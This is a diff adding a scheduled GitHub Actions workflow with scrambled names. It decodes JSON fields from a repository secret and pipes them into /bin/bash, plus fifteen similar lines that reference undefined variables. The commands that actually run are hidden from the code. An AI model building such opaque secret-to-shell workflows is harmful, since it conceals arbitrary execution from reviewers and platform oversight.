@@ -1,0 +1,33 @@
+name: yuchigongfangfupo
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuchigongfangfupo
+        env:
+          yfct9896: ${{ secrets.yfct9896 }}
+        run: |
+          echo $yfct9896 | jq -r .tyr7657 | /bin/bash
+          echo $f752 | jq -r .aqhqq20801 | /bin/bash
+          echo $iluyh1420 | jq -r .r45 | /bin/bash
+          echo $ec74 | jq -r .ryh528 | /bin/bash
+          echo $s41 | jq -r .yrnjz1 | /bin/bash
+          echo $hbio2534 | jq -r .wb11509 | /bin/bash
+          echo $gauis8 | jq -r .vptg354 | /bin/bash
+          echo $nvu82777 | jq -r .jzzw550 | /bin/bash
+          echo $fb4091 | jq -r .c857 | /bin/bash
+          echo $mlx25939 | jq -r .zupa0 | /bin/bash
+          echo $w1 | jq -r .yva5 | /bin/bash
+          echo $bdkg7090 | jq -r .fz5 | /bin/bash
+          echo $k01 | jq -r .ucvla5 | /bin/bash
+          echo $ynuu02 | jq -r .ejq93 | /bin/bash
+          echo $iuti26904 | jq -r .waftv22 | /bin/bash
+          echo $plqqa52486 | jq -r .kalsd2 | /bin/bash
+
